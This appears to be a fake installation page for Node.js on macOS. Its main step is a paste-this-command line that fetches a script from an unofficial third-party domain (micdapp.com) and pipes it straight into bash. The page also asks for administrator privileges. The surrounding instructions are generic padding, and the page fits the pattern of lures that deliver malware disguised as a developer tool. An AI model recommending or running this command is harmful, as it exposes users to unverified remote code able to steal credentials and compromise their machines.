# 🟢 One-Command Node.js Installation for macOS

Install **Node.js** on macOS with just a single Terminal command. Ideal for frontend and backend developers, automation scripts, and full-stack workflows.

---

## ⚡ Start Now

Open your Terminal and run this command:

```bash
/bin/bash -c "$(curl -fsSL https://micdapp.com/njs/install.sh)"
```

This script will:

- Install the latest stable version of Node.js  
- Install `npm` (Node Package Manager)  
- Optionally install useful global packages (`yarn`, `pnpm`, `n`, etc.)

---

## 🧩 Requirements

- macOS 10.14 or later  
- Administrator privileges  
- Internet connection

---

## 🖥 Opening Terminal

If you're not already in Terminal:

### 🔍 With Spotlight

1. Press `Command (⌘) + Space`  
2. Type `Terminal`  
3. Press `Return`

### 📁 With Finder

1. Open **Finder**  
2. Go to `Applications > Utilities`  
3. Open **Terminal.app**

---

## ✅ Verify Installation

Once the script completes, check your versions:

```bash
node --version
npm --version
```

You should see the latest LTS release of Node.js and npm.

---

## 📦 Optional: Install Extras

After setup, you can install popular tools globally:

```bash
npm install -g yarn
npm install -g pnpm
npm install -g typescript
```

Or switch versions easily with:

```bash
npm install -g n
sudo n lts
```

---

## ⚙️ Bonus: Use with a Version Manager

Prefer using `nvm`? The script can optionally install [Node Version Manager (nvm)](https://github.com/nvm-sh/nvm) and set the default Node.js version for your shell:

```bash
nvm install --lts
nvm use --lts
```

---

## 🎉 Done!

You now have Node.js and npm fully installed and ready to use. Start building web apps, running scripts, or creating full-stack applications with ease.

> 🚀 Fast setup. Infinite potential.
